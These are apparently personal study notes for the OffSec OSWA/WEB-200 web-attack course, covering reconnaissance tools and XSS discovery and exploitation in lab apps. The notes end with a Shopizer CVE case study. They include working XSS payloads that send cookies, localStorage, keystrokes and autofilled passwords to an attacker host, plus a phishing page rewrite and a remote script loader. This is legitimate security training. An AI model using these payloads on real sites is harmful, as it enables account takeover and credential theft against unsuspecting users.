---
title: '[OSWA, WEB-200] Instructional notes - Part 1'
disqus: hackmd
---

[OSWA, WEB-200] Instructional notes - Part 1
===


# Table of Contents
[TOC]

# Web Application Enumeration Methodology

Web Application 通常是組織面臨的最大攻擊面。任何擁有瀏覽器和網路連線的人都可以發現並與面向公眾的網路應用程式互動。

## Web Application Reconnaissance
- Scope: 避免越界測試，定義測試 hostnames, URL, IP addresses 和 application functionality (可能不包含常用 CDN、第三方 API、外部服務等)
- 被動資訊蒐集（OSINT）：不直接攻擊、不掃描，例如查公開資料、正常瀏覽網站、註冊帳號
    - 透過 Kali [whois](https://www.kali.org/tools/whois/) 或 lookup tool 取得網域名稱或 IP 位址
    - GitHub / GitLab 洩漏資訊
    - Subdomain: [DNSDumpster](https://dnsdumpster.com/)、[certificate transparency](https://certificate.transparency.dev/) 
    - CTI: Shodan

## Web Application Enumeration
Running Services、HTTP Endpoints、Error Messages、Outdated Components

>[!Note]
>[Tech stack](https://www.mongodb.com/resources/basics/technology-stack):\
>![image](https://hackmd.io/_uploads/S1tHfU9SWl.png)

### Accessing the Enumeration Sandbox Application
```
┌──(chw💲CHW)-[~]
└─$ sudo cat /etc/hosts  
192.168.52.108  enum-sandbox
...
```

### Discovering Running Services
透過 nmap 偵查哪些 port 是開的、每個 port 實際跑的是什麼服務與版本，才能判斷攻擊方向與 payload 要怎麼利用。\
Nmap 預設會用 ICMP + TCP 80/443 探測
- `--script http-methods`: 實際允許哪些 HTTP Method

若找到可利用之 HTTP Method 與路徑\
`--script-args`：把參數傳給 Nmap 的 NSE 腳本，改變腳本的行為或測試目標。(指定路徑、帳密、timeout、測試方式等)\
Ex. `/upload` 允許 PUT，可能可以直接上傳檔案
```
nmap -p 80 --script http-methods --script-args http-methods.url-path='/upload' <target>
```
![image](https://hackmd.io/_uploads/H1GPh85H-x.png)

常見指令：
```
--script-args key=value
--script-args key1=value1,key2=value2
--script-args http-methods.url-path='/upload'
--script-args http-enum.basepath=/admin
--script-args ftp-brute.userdb=users.txt,ftp-brute.passdb=pass.txt
--script-args unsafe=1 # 啟用危險或侵入行為
--script-args http-shellshock.uri=/cgi-bin/status
--script-args timeout=10s
```

### Banner Grabbing
主動連線到服務，透過回傳的資訊（banner / headers）判斷服務種類、軟體版本、作業系統線索

![image](https://hackmd.io/_uploads/ByPHQwcHZe.png)

![image](https://hackmd.io/_uploads/rJo8QPqrZg.png)

透過 Banner Grabbing 尋找已知漏洞 / CVE、決定 payload 用法、決定路徑（Linux vs Windows）。

### Manual HTTP Endpoint Discovery
- forms 
- robots.txt 
- XML sitemaps (sitemap.xml, sitemap_index.xml)
- /admin, /backup, /internal, /old, /dev, /test

#### 1. Crawler
Hakrawler 是一個用 Go 語言寫的快速網頁爬蟲工具，用途主要是用來爬取網站中的 URL、路徑與參數
![image](https://hackmd.io/_uploads/SJMcAw9H-e.png)

```
┌──(chw💲CHW)-[~]
└─$ echo "http://enum-sandbox" | hakrawler -u
```
![image](https://hackmd.io/_uploads/r1B7pw5B-g.png)

#### 2. Brute Force / Directory Busting
DIRB 是 Web 目錄、檔案爆破工具
```
┌──(chw💲CHW)-[~]
└─$ dirb http://enum-sandbox/
```
![image](https://hackmd.io/_uploads/S1PvgdqSbg.png)

Kali 的 `/usr/share/wordlists` 目錄下提供了多個字典檔\
![image](https://hackmd.io/_uploads/SkFdbd5H-l.png)

### Information Disclosure
利用錯誤訊息與異常回應，間接洩漏系統資訊\
Ex. 透過登入是失敗資訊 "No matching user found"，尋找可用 User

>[!Note]
> - Oracle → ORA-xxxxx
> - MySQL → You have an error in your SQL syntax
> - .NET → System.NullReferenceException: 後端是 ASP.NET / .NET
> - Java → NullPointerException: Java 最典型的 Runtime Exception


透過字典檔爆破登入頁面，找到可用 User
```
ffuf -w /usr/share/wordlists/seclists/Usernames/Names/names.txt -u http://enum-sandbox/auth/login -X POST -d 'username=FUZZ&password=chw' -H 'Content-Type: application/x-www-form-urlencoded' -fs 2093
```
> `- fs`: 過濾失敗回應的 response 長度

![image](https://hackmd.io/_uploads/By5HqsjHbl.png)

### Components with Vulnerabilities
前端 Components（Ex. JavaScript framework / library）本身可能是漏洞來源，而且通常直接關聯到 XSS 攻擊
-  Burp Suite extension: [Retire.js](https://portswigger.net/bappstore/36238b534a78494db9bf2d03f112265c)\
前端元件漏洞掃描工具，識別使用哪些 JS library、版本、已知漏洞

## Sourcing Wordlists
- Common Wordlists
    - [SecLists](https://github.com/danielmiessler/SecLists): `/usr/share/wordlists/seclists/`
    - [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings): `/usr/share/payloadsallthethings/`

- Creating Custom Wordlist
CeWL: Custom Word List generator。 Kali 內建的自訂詞表產生器，會抓取 URL，並從頁面中產生單字清單
```
cewl --write output.txt --lowercase -m 5 http://enum-sandbox/
```
透過 semantic enumeration 從 enum-sandbox 頁面中取 5 位元產生字典檔 (定義小寫)\
![image](https://hackmd.io/_uploads/rJ0Fz3sHWe.png)

不只 Web，OS / Command injection 也能利用
建立一個 Binary 字典檔：
```
ls /usr/bin | grep -v "/" > binaries.txt
```
![image](https://hackmd.io/_uploads/Skz5mhiSbx.png)

- Using LLMS to Help Create Custom Wordlists
透過 LLM Prompt 產生字典檔
```
A user will provide the HTML content of a website.
Extract all the words from this page to make a list.
Then, remove all the words that are generic.
Remove any word that is generic HTML, JavaScript, the name of any CSS or JavaScript library.
Remove all other generic words.
Return the words that are left, after all the generic words have been removed.
```
利用腳本截取：
```py=
import requests
import os

from openai import OpenAI

r = requests.get('https://www.megacorpone.com')

client = OpenAI(api_key=os.environ.get("OPENAI_API_KEY"))

response = client.chat.completions.create(
  model="gpt-3.5-turbo",
  messages=[
    {"role":"system", "content":
         "A user will provide the HTML content of a website. "
         "Extract all the words from this page to make a list. "
         "Then, remove all the words that are generic. "
         "Remove any word that is generic HTML, JavaScript, the name of any CSS or JavaScript library. "
         "Remove all other generic words. "
         "Return the words that are left, after all the generic words have been removed."},
    {"role":"user", "content": r.text}
  ]
)

wordlist = response.choices[0].message.content.strip()
print(wordlist)
```

## Types of Attacks
把前面 enumeration 的資訊對應到實際目標與攻擊目的

Side | Target | Effect | Example
:------:|:---------------------|:---------------------:|:---------------------|
Client-side attacks  |    User / Broswer    |    Session hijacking, Cookie / Token steal, Info Leak    |     XSS, CSRF, Malicious JS
Server-side attacks  |    Web App / Server    |   DB Leak, File R/W, RCE    |     SQLi, File Inclusion, Cmdi, Insecure Deserialization

- Bind Shell
NAT / Reverse Proxy 可能會擋，且任何人都能連
- Reverse Shell
高機率可穿過 NAT / 防火牆，只有你能接到
- Web Shell
不需要額外 port、很隱蔽
Kali : `/usr/share/webshells`\
![image](https://hackmd.io/_uploads/ByP2gpiS-e.png)

# Introduction to Burp Suite
>[!Important]
> >"Learning Burp Suite makes you turn sweet" 
> > [name=CHW]

 
![image](https://hackmd.io/_uploads/Bk7JVpjS-e.png)
> Repeater, Comparer, Intruder, Decoder

# Cross-Site Scripting Introduction and Discovery

Cross-Site Scripting（XSS）不只是彈 `alert(1)`，可將惡意內容被動態注入頁面。且攻擊不是打 server，是打使用者的瀏覽器 (受害者的權限通常 比攻擊者高)

>[!Tip]
>XSS 👉🏻 Privilege Amplifier

Modern protection against XSS: [`HttpOnly`](https://owasp.org/www-community/HttpOnly), [`Content Security Policy (CSP)`](https://developer.mozilla.org/en-US/docs/Web/HTTP/Guides/CSP)

> - Use HttpOnly Cookie → 模擬 JS 不能讀 cookie
> - Use Non-HttpOnly Cookie → 模擬可被 document.cookie 讀 v取
> - Blindly enter credentials → 模擬釣魚（自動輸入帳密）
> - Use stored password → 模擬瀏覽器自動填密碼
> - Simulate keystrokes → 模擬使用者在頁面輸入
> - Data in Local Storage → 在載入前放入敏感資料

## JavaScript Basics for Offensive Uses

當 Broswer 收到一個 HTML response 時，Broswer 會建立一個 Document Object Model (DOM) Tree 並將其渲染。 DOM 包含頁面上的所有表單、輸入框、圖像等 Element。 JavaScript 可以存取和編輯頁面的 DOM，從而與用戶互動。\
從漏洞利用的角度來看，當攻擊者能夠注入 JavaScript 程式碼，就可以存取和修改頁面的 DOM。透過存取 DOM 可讓攻擊者重新導向登入表單、竊取密碼、進行網路釣魚等等。

### Syntax Overview

>[!Tip]
> ⚠️ 沒事，我 Code Review 也很爛\
> 以下說明你的鄰居也看得懂

[JavaScript function](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Guide/Functions) 
```js=
function processData(data) {
    data.items.forEach(item => {
      console.log(item)
    });
  }

  let foo = {
    items: [
      "Hello",
      "CHW",
      "Boy"
    ]
  }

  processData(foo)
```

> Line 01：function processData(data) {
>> - `function`：宣告函式
>> - `processData`：函式名稱
>> - `(data)`：參數（argument / parameter）
>> - 呼叫函式的人會把一個值丟進來，在函式中以 data 這個變數代表
>> - `{ ... }`：函式本體（裡面放執行的指令）
>
> Line 02：data.items.forEach(item => {
>> - `data.items`: data 是傳進來的參數、.items 是存取物件的屬性（property）
>> - `.forEach(...)`: Array method 對陣列中的每個元素都做一次
>> - `item => { ... }`: Arrow function 每次迴圈拿到的元素叫 item，然後執行大括號裡的動作
> 
> Line 03：console.log(item)
>> - `console`： Broswer 提供的 Console API 物件
>> - `log`： console 物件上的 method
>> - `log(item)`： 把 item 印到 console
攻擊者用途: payload 時常用 `console.log() debug`，確認是否拿到 cookie / localStorage / DOM 元素。
>
> Line 07：let foo = { ... }
>> - `let`：宣告一個變數（variable）
>> - `foo`：變數名稱
>> - `=`：把右邊的值指派給 foo
>> - `{ ... }`：Object 的 [object literal](https://en.wikipedia.org/wiki/Literal_(computer_programming))
>> - `let` vs `const`：用 let 方便理解，實務上不會改值通常用 const。
> 
> Lines 08–12：items: [ ... ]
>> - `items`: 是物件的屬性（key）
>> - `[ ... ]`: 陣列（array），陣列裡放三個字串（string）
>
> Line 15：呼叫函式（Function call）
>> - `data` = `foo`
>> -  `data.items` = `foo.items`

Broswer 透過 `about:blank` 可開啟空白頁\
透過 F12 developer tool 驗證以上 JS\
![image](https://hackmd.io/_uploads/r1X4KfTS-x.png)

console.log 是 Broswer 提供的 [Console  API](https://developer.mozilla.org/en-US/docs/Web/API) 中的一個內建方法\
若利用某個漏洞注入 JavaScript 程式碼，就可以存取更多有用的 Web API。例如常用 API 包括  [Window](https://developer.mozilla.org/en-US/docs/Web/API/Window) 和 [Document](https://developer.mozilla.org/en-US/docs/Web/API/Document)

### Useful APIs

Window API 表示文件所在的視窗。除了眾多屬性外，也允許透過 [location property](https://developer.mozilla.org/en-US/docs/Web/API/Window/location) 存取 URL 及存取可能包含金鑰的 [localStorage](https://developer.mozilla.org/en-US/docs/Web/API/Window/localStorage)

常見重要屬性:
- `window.location` → 目前 URL（可讀、可改）
- `window.localStorage` → 本地儲存（token、JWT、session）
- `window.document` → DOM（整個頁面）
- `window.alert()` → 彈窗

![image](https://hackmd.io/_uploads/BJf9raaS-g.png)

以下用 [CHW World](https://chw41.github.io/1ogin/) 環境為範例： 

#### 1. 在 documentation 中找到 getElementsByTagName() Method
利用 `getElementsByTagName()` method ，將 text boxes 使用`<input> ` Tag 建立，並且把 `<input>` Tag 當作參數傳給 Method
```js
let inputs = document.getElementsByTagName("input") 
```
![image](https://hackmd.io/_uploads/r1YMt6aHWg.png)

#### 2. 遍歷頁面中 inputs 變數的元素
透過 for loop 迭代紀錄 `HTML <input> Element`的值，並儲存至 input 中 
```js
for (let input of inputs){
    console.log(input.value)
}
```
![image](https://hackmd.io/_uploads/rydWcp6Bbg.png)
> 因為還沒在頁面中輸入內容，所以是 Empty

(輸入：admin/password)\
![image](https://hackmd.io/_uploads/rJ82qapBZx.png)
> 提取輸入框中的值


#### - Event Listener
`document.addEventListener()` method 可以將每次按鍵新增事件監聽器。攻擊者會用來窺探受害者的 messages 和 credentials

利用 document.addEventListener() 紀錄 [event code](https://developer.mozilla.org/en-US/docs/Web/API/Document_Object_Model/Events)

```
function logKey(event){
  console.log(event.key);
}

document.addEventListener('keydown', logKey);
```
![image](https://hackmd.io/_uploads/ByxCfCTSbl.png)

🥚 截取自己的按鍵操作意義不大，應該嘗試截取其他使用者的按鍵操作\
讓任何輸入的 JavaScript 程式碼都會在渲染時被受害者執行\
👉🏻 `Fetch API` 

Fetch API 允許使用者的瀏覽器向遠端資源發出網路請求，可以用來獲取文件、使用者資訊、圖像等等

將 logKey 資訊 fetch 到 Kali
```
function logKey(event){
  fetch(
    "http://{Kali I}/k?key=" + event.key
  );
}

document.addEventListener('keydown', logKey);
```
(Kali)
```
python3 -m http.server 80
```
logKey 透過 fetch `/k?key=` 成功送到 Kali \
![image](https://hackmd.io/_uploads/SkDNgzRS-e.png)

## Cross-Site Scripting - Discovery
>[!Important]
> XSS 相關學術研究可以參考這篇：
> [應用對抗式樣本於 XSS 模糊測試之防禦研究](https://hdl.handle.net/11296/h2u7nj) 🎓

Cross-Site Scripting = JavaScript injection
XSS 並非因為 Application 接收 untrusted input 而被利用，而是因為Application `outputs` 不受信任的輸入而存在漏洞
```
Untrusted Input
    ↓
[ Process / Store ]
    ↓
Output Encoding（HTML / JS / Attribute encoding）
    ↓
Browser
```
- Stored XSS
- Reflected XSS
- DOM-based XSS = Client XSS
Client XSS 不容易被偵測：
    - payload ：location.hash, location.search, localStorage, postMessage
    - JS : innerHTML, document.write, eval, setTimeout(string), new Function

根據類型可以細分為：`stored server XSS`, `stored client XSS`, `reflected server XSS`, or `reflected client XSS`.

### Reflected Server XSS
通常出現在 User 透過 GET 發送，攻擊者會向 User 發送帶有惡意 Payload 的連結，點擊連結觸發攻擊\
POST 也可能導致 Reflected XSS 。🥚 攻擊者無法透過連結來誘騙用戶，需要將 User 引誘到網站，並在 User 造訪時自動提交表單。

例如在 Query 中測試 XSS
```
?name=%22%3Cscript%3Ealert(%22CHW%22)%3C/script%3E
```

### Stored Server XSS
與 Reflected 不同，任何存取 vulnerable page 的使用者都會執行有效 payload。不局限於 GET 請求

![image](https://hackmd.io/_uploads/r12c5XRrWe.png)

送出後檢視原始碼 (Edit As HTML)\
![image](https://hackmd.io/_uploads/BycEHECB-x.png)
> 可以發現 Server 將 HTML encode 過，無法注入 XSS

選擇其他欄位，將 number 改成 text 測試\
![image](https://hackmd.io/_uploads/r1KnOECSZx.png)

### Reflected Client XSS
Payload 沒有被 server 放進 HTML，而是被前端 JavaScript 從 URL 讀出來，再動態塞進 DOM
> 1. HTTP Response 本身 看不到 payload
> 2. 只有「瀏覽器完整執行 JS 後」才會觸發
> 3. Network 看不到，不代表沒弱點

在 URL `/?name=CHW`，前端 JS 會讀取 query parameter (用 innerHTML 把值塞進 DOM)
![image](https://hackmd.io/_uploads/rynu1PAS-e.png)
![image](https://hackmd.io/_uploads/HJbFMwASbg.png)


但為什麼注入 <script> 不會成功觸發 XSS ?!
>[!Important]
> HTML5 規定 innerHTML 會**解析 HTML 結構**，但不會**啟動 JavaScript 執行引擎** ([innerHTML](https://developer.mozilla.org/en-US/docs/Web/API/Element/innerHTML))
> 會透過以下結構將 HTML Parser 解析成 DOM 節點
> ```
> ElementNode: <h1>
> └── TextNode: "CHW"
> ```
>
> ⚠️ 若 <script> 在 innerHTML 會執行，會造成 `element.innerHTML = userInput;`\
> 任何前端程式都自動變 RCE 等級弱點
                                                                            
既然 <script> 無法執行，可以使用其他方法:
![image](https://hackmd.io/_uploads/H1zTVDCSbl.png)

[環境範例]\
Pretty Print 的頁面
![image](https://hackmd.io/_uploads/S1v2tvAH-l.png)

尋找 XSS 注入點：
1. 查看 HTML\
![image](https://hackmd.io/_uploads/rJVmqPRBZg.png)

2. 查看 JS\
![image](https://hackmd.io/_uploads/B1oJswCHZl.png)
> innerHTML 解析字串

```
params.csv                // URL query
↓
atob(params.csv)          // Base64 decode
↓
document.getElementById("csv").value
↓
parseCSV()
↓
cell
```
> 🧠： 製作符合 JS 架構的 Payload，在 csv Table 中注入 XSS，再做 Base64 decode
         
建構 payload 步驟：
```
<script>alert("chw")</script>
↓
#,User,active
55688,<img src='x' onerror='alert("CHW")'>,1
↓
IyxVc2VyLGFjdGl2ZQo1NTY4OCw8PGltZyBzcmM9J3gnIG9uZXJyb3I9J2FsZXJ0KCJDSFciKSc+LDE=
↓
/?csv=IyxVc2VyLGFjdGl2ZQo1NTY4OCw8PGltZyBzcmM9J3gnIG9uZXJyb3I9J2FsZXJ0KCJDSFciKSc+LDE=
```
![image](https://hackmd.io/_uploads/rJltyW1I-g.png)
> 以 img 形式注入 XSS
>![image](https://hackmd.io/_uploads/S12qyZJIZe.png)

### Stored Client XSS
Stored Client XSS 之攻擊 payload 被儲存起來，但是**在前端 JS 裡被取出並執行**

輸入表單後：\
![image](https://hackmd.io/_uploads/Hkl7zbyI-x.png)

觀察 JS
#### 1. document.getElementById("welcome").innerHTML
![image](https://hackmd.io/_uploads/H1PymbkUZe.png)
> 看起來存在 Reflected Client XSS
```
?name=%3Cimg%20src=%27x%27%20onerror=%27alert(%22CHW%22)%27%3E&result
```
![image](https://hackmd.io/_uploads/S1VLQ-y8be.png)
確實存在 但這篇主題是 Stored Client XSS (r繼續找)

#### 2. ``$('#data').append(`<tr><td>${key}</td><td>${value}</td></tr>`);``
![image](https://hackmd.io/_uploads/Hkr7EWJUbx.png)
${value} 沒有過濾，可透過表單注入

透過 Alert topic 辨識哪一個欄位觸發
```
<img src='x' onerror='alert("age")'>
<img src='x' onerror='alert("city")'>
<img src='x' onerror='alert("winter")'>
<img src='x' onerror='alert("driving")'>
<img src='x' onerror='alert("music")'>
<img src='x' onerror='alert("phone")'>
```
![image](https://hackmd.io/_uploads/SJYow-kI-e.png)
> 全部欄位皆觸發


>[!Note]
>出現以下 API，可往 XSS 方向探索：
> `innerHTML`, `outerHTML`, `document.write`, `insertAdjacentHTML`, `jQuery.html()`, `eval`, `setTimeout(string)`

# Cross-Site Scripting Exploitation and Case Study
XSS 的真正價值不是能夠執行 JS，而是利用使用者的瀏覽器權限做事
## Cross-Site Scripting - Exploitation
現代瀏覽器 Session Cookie 幾乎都設 [HttpOnly](https://owasp.org/www-community/HttpOnly) (讀不到 JS 、document.cookie 拿不到 session)
- 透過 XSS 載入 external resources
- 提取 Broswer local storage 中的 secrets
- Log a victim's keystrokes
- 從密碼管理器中提取已儲存的密碼
- Realistic 網路釣魚攻擊

### Moving the Payload to an External Resource
在網站中注入 HTML script tag，JS 從 Kali 載入
```
┌──(chw💲CHW)-[~/Offsec/OSWA]
└─$ mkdir XSS

┌──(chw💲CHW)-[~/Offsec/OSWA]
└─$ cd XSS

┌──(chw💲CHW)-[~/Offsec/OSWA/XSS]
└─$ echo "alert(1)" > xss.js

┌──(chw💲CHW)-[~/Offsec/OSWA/XSS]
└─$ python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...

```
![image](https://hackmd.io/_uploads/SyAStGyL-g.png)

Client XSS:
```
<img src=x onerror="   
    var s=document.createElement('script');
    s.src='http://{Kali IP}/xss.js';   
    document.body.appendChild(s); ">
```

Load External Resource 的好處是能夠看到來源 IP 且可以即時編輯 JS
![image](https://hackmd.io/_uploads/rJ5PYGyIWl.png)


### Stealing Session Cookies
使用 JavaScript 透過 document.cookie 屬性存取頁面的 cookie ，並提取該值，對其進行 URL 編碼，然後使用 fetch 送回我們的 Kali 虛擬機器。
以上動作皆在 `xss.js` 完成
```
┌──(chw💲CHW)-[~/Offsec/OSWA/XSS]
└─$ cat cookie.js 
let cookie = document.cookie

let encodedCookie = encodeURIComponent(cookie)

fetch("http://{Kali IP}/exfil?data=" + encodedCookie)

┌──(chw💲CHW)-[~/Offsec/OSWA/XSS]
└─$ python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...

```
![image](https://hackmd.io/_uploads/B1gzVkXyIbe.png)
> 成功取得 Cookie\
> 透過切換 Non-HttpOnly 與 HttpOnly 可以測試能夠取得 Cookie 與否\
> ![image](https://hackmd.io/_uploads/HJ3vymJ8bx.png)


### Stealing Local Secrets
local storage 可能包含 API 金鑰或使用者個人資訊等敏感資訊。
> [session Storage](https://developer.mozilla.org/en-US/docs/Web/API/Window/sessionStorage) & [local Storage](https://developer.mozilla.org/en-US/docs/Web/API/Window/localStorage)\
>localStorage 會保留資料，直到被明確刪除，而 sessionStorage 則會保留資料，直到標籤頁關閉

```
┌──(chw💲CHW)-[~/Offsec/OSWA/XSS]
└─$ cat localsecret.js

let data = JSON.stringify(localStorage)

let encodedData = encodeURIComponent(data)

fetch("http://{Kali IP}/exfil?data=" + encodedData)
```

若與 [Reflected-Client-XSS](#Reflected-Client-XSS) 相同情境，一樣建構 Payload 格式，從中注入 localsecret.js\p;
![image](https://hackmd.io/_uploads/Bkt6B71U-e.png)

### Keylogging
攻擊 Application 不一定是最佳策略。若網站使用者才是更大的目標，可利用 XSS 搭配 Keylogging，也不容易被使用者察覺
不過 listener 只侷限在當前的 document，若使用者切換到其他 tab 或 appplication 就會中斷 keystrokes
```
function logKey(event){
        fetch("http://{Kali IP}/k?key=" + event.key)
}

document.addEventListener('keydown', logKey);
```

![image](https://hackmd.io/_uploads/SkI1CqkI-g.png)

### Stealing Saved Passwords
有些 password manager 會在登入提示出現時自動填入，方便使用者登入。攻擊者可利用這一點來竊取使用者儲存在 password manager 中的憑證。在大多數情況下，這種竊取幾乎可以瞬間完成，而且不易察覺。

尋找 username (or email) 輸入框以及 type attribute 為 password 的輸入框的組合。作為攻擊者，可以創建一個類似的表單讓瀏覽器自動填充，從而竊取憑證並將其洩漏出去。
```
let body = document.getElementsByTagName("body")[0]

  var u = document.createElement("input");
  u.type = "text";
  u.style.position = "fixed";
  //u.style.opacity = "0";

  var p = document.createElement("input");
  p.type = "password";
  p.style.position = "fixed";
  //p.style.opacity = "0";

  body.append(u)
  body.append(p)

  setTimeout(function(){ 
          fetch("http://192.168.49.51/k?u=" + u.value + "&p=" + p.value)
   }, 5000);
```
一樣透過 XSS payload 注入 JS：
```
<img src=x onerror=" var s=document.createElement('script'); s.src='http://{Kali IP}/stealPass.js'; document.body.appendChild(s); ">
```
![image](https://hackmd.io/_uploads/Bye_SoyIZg.png)\
![image](https://hackmd.io/_uploads/SkvtSj1LZl.png)

### Phishing Users
鑑於攻擊者擁有對 HTML 完全存取的權限，因此可以重寫整個頁面，隨意設定樣式並添加任何所需的 HTML 元素 
👉🏻 仿造登入頁面，但當 User 提交憑證時，提交的內容會發送給 攻擊者，而不是預期的伺服器。將表單提交的位置替換為 Kali IP 

為了讓頁面盡可能逼真，理想情況下，會使用一個現有的登入頁面，然後更改表單的 action 屬性

若該網站有 login 介面，可以直接 Fetch 引用。直接用 victim browser 抓官方登入頁，也較擬真
```js
fetch("login").then(res => res.text().then(data => {
```

若標的不存在登入頁面，可 fetch 外網登入頁面
```js
fetch("https://chw41.github.io/1ogin") 
  .then(res => {
    if (!res.ok) {
        throw new Error("HTTP error " + res.status);
    }
    return res.text();
  })
  .then(data => {
    document.documentElement.innerHTML = data;
    const form = document.getElementsByTagName("form")[0];

    if (form) {
      form.action = "http://192.168.45.245/";
      form.method = "get";

      const inputs = form.getElementsByTagName("input");
      if (inputs.length >= 2) {
        inputs[0].name = "username";
        inputs[1].name = "password";
      }
    }
  })
  .catch(err => {
    console.log("Fetch failed, loading fallback...");
    document.documentElement.innerHTML = `
      <form action="http://192.168.45.245/" method="GET">
        <input type="text" placeholder="name@example.com" name="username">
        <input type="password" placeholder="Password" name="password">
        <button type="submit">Sign in</button>
      </form>`;
  });

```

透過 XSS 注入 Javascript\
![image](https://hackmd.io/_uploads/HkgdwZCJ8Wl.png)

成功注入後，會 Fetch 到指定的 HTML 頁面
![image](https://hackmd.io/_uploads/HJp9b0yUWl.png)

>[!Tip] XSS Summary
>Method | Restriction |
>:------:|:---------------------|
>Stealing Cookies  |    HttpOnly    | 
>Keylogger |    User 需要輸入    |
>Password manager |    不一定 auto-fill    |
>Phishing |    只要使用者相信畫面   |

## Case Study: Shopizer Reflected XSS
[環境範例]\
在 [Shopizer](https://www.shopizer.com/)（Java 開源電子商務平台）發掘 XSS 👉🏻 [CVE-2021-33562](https://www.cve.org/CVERecord?id=CVE-2021-33562)

嘗試發現漏洞，並建構有效 Payload

![image](https://hackmd.io/_uploads/B1hz7ce8Wx.png)

- 創建帳號\
![image](https://hackmd.io/_uploads/HJjRHceLbx.png)

### Discovering the Vulnerability

#### 1. 尋找注入點
在 Products > Handbags：
`/shop/category/handbags.html/ref=c:2`有 query string 但沒有參數 `/?pam=`\
![image](https://hackmd.io/_uploads/HymGwqlUbx.png)

多處引用到且在 Line:746 server 生成頁面時把 ref=... 塞進 inline JS\
![image](https://hackmd.io/_uploads/ByGQYceLWx.png)\
![image](https://hackmd.io/_uploads/HynsqceI-g.png)

#### 2. 嘗試注入
- 測試注入字串 會不會寫入 server
`/ref=c:2'XSS`\
![image](https://hackmd.io/_uploads/SkYZi5l8Zl.png)
> 成功寫入

- 測試注入 Method
`/ref=c:2';alert(41);'`\
![image](https://hackmd.io/_uploads/S1RbCceL-x.png)
> 404

>[!Tip]
>試試用 `+` 代替 `;`
>> 跳出字串：用 `'`\
>> 為了讓 JS 語法合法：在不使用 `;` 的情況下，用 `+` 把後面的東西接成一個 expression (+ 在 JS 裡是字串串接/數值加法運算子)

關閉原字串、用 expression 執行 JS、再把字串補回去\
👉🏻 `' + <JS expression> + '`

- `+` 取代 `;`
`/ref=c:2'+alert(41)+'`\
![image](https://hackmd.io/_uploads/Sy2iC5lUbg.png)\
![image](https://hackmd.io/_uploads/By-A0clU-l.png)
> 成功注入且執行

###  Loading Remote Scripts
透過 URL 注入 JavaScript Payload，如果嘗試更複雜的 Payload，可能會遇到字元限制的問題

#### 1. 尋找現成 Resources 利用點
在 Shopizer 中會載入多個 [jQuery](https://en.wikipedia.org/wiki/JQuery) file

![image](https://hackmd.io/_uploads/rkihoslLWl.png)


探索  jQuery library 後，其中可以直接利用原生的 [`jQuery.getScript()`](https://api.jquery.com/jquery.getscript/) 載入和執行遠端 JavaScript

#### 2. 利用原生 Function
需要向 `jQuery.getScript()` 傳送 URL，為避免太多特殊符號導致伺服器無法讀取，可利用 `atob('Base64 decode')` 來避免
- 利用 jQuery.getScript() 存取腳本
```
jQuery.getScript('http://{Kali IP}/alert.js')
```
![image](https://hackmd.io/_uploads/SJC7fpeLWl.png)


- 建立 payload
```
'+eval(atob('alF1ZXJ5LmdldFNjcmlwdCgnaHR0cDovLzE5Mi4xNjguNDUuMjQ1L2FsZXJ0LmpzJyk='))+'
```
![image](https://hackmd.io/_uploads/S1dFCoxUbx.png)
> 跳出 Error

且檢查 Kali HTTP Server 有確實存取到\
![image](https://hackmd.io/_uploads/r1JZXTxIWx.png)



檢查伺服器回應內容：\
![image](https://hackmd.io/_uploads/BkmSQ6l8Zx.png)\
![image](https://hackmd.io/_uploads/H1cNf2xIWg.png)


可以得知請求中發現無效字元\
🧠： jQuery.getScript() 回傳格式錯誤

>[!Important]
> [btoa()](https://developer.mozilla.org/en-US/docs/Web/API/Window/btoa): \
> 會將一段字串再轉成 Base64（變成「安全字元集合」），所以如果 payload 執行後會產生某個字串，而這個字串可能被塞到 URL / request target。那可以將 payload  Base64 化，就不會含非法字元，伺服器也不會因 request target 非法而 400。
> > 🧠：為什麼不直接注入 Base64 encode，而是要 `atob → eval → btoa`❓❓❓\
> > Ans: Base64 只是包裝，而非可執行的程式碼。Broswer 並不會自動執行 Base64 。若直接傳入 Base64 encode 會得到 `url = url + '?ref=c:2YWxlcnQoMSk=';`

- btoa() 建立 Payload
```
'+btoa(eval(atob('alF1ZXJ5LmdldFNjcmlwdCgnaHR0cDovLzE5Mi4xNjguNDUuMjQ1L2FsZXJ0LmpzJyk=')))+'
```
![image](https://hackmd.io/_uploads/HkD0zagLZl.png)
> 成功觸發

### Exploiting Reflected XSS
在頁面中 User credential 使用 JSESSIONID cookie 來追蹤，另外也設定了 HttpOnly attribute，導致無法竊取其他使用者的 cookie\
![image](https://hackmd.io/_uploads/S1dAvpxIWe.png)

🥚 只要 cookie 限定在請求的網域內，瀏覽器就會允許 JS 傳送包含該 cookie 的請求

>[!Note]
>為什麼偷不到 JSESSIONID，但還是能攻擊？
>> HttpOnly 會做什麼？
>> HttpOnly 只做一件事：`document.cookie 讀不到 JSESSIONID ❌`\
>> 但瀏覽器仍然自動把 JSESSIONID 附在同網域的請求上
>> 也就是說：\
>> `fetch('/shop/customer/updateAddress.html')` 的 Request 中也會帶著 Cookie 傳送\
>> 👉🏻 Session Riding / XSS-driven CSRF

目標：先尋找 Request 範例\
![image](https://hackmd.io/_uploads/HJ80Ky-L-g.png)
> - Change password 會需要 User 的密碼
> - 選擇 Billing & shipping info 下手，Shipping address 可以 Add a new address

![image](https://hackmd.io/_uploads/rJNjokWIWe.png)
![image](https://hackmd.io/_uploads/HkmnsJbIbg.png)

可以取得帶有自己 Cookie 的 POST Request
```
POST /shop/customer/updateAddress.html HTTP/1.1
Host: shopizer:8080
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: application/x-www-form-urlencoded
Content-Length: 181
Origin: http://shopizer:8080
Connection: keep-alive
Referer: http://shopizer:8080/shop/customer/editAddress.html
Cookie: cookieconsent_status=dismiss; JSESSIONID=C922032A0F6BB19E0C33C5778876D8D9; user=DEFAULT_chw@chw.com
Upgrade-Insecure-Requests: 1
Priority: u=0, i

customerId=200&billingAddress=false&firstName=CHW&lastName=41&company=&address=address&city=city&country=AL&stateProvince=TW&postalCode=55688&phone=0909&submitAddress=Change+address
```
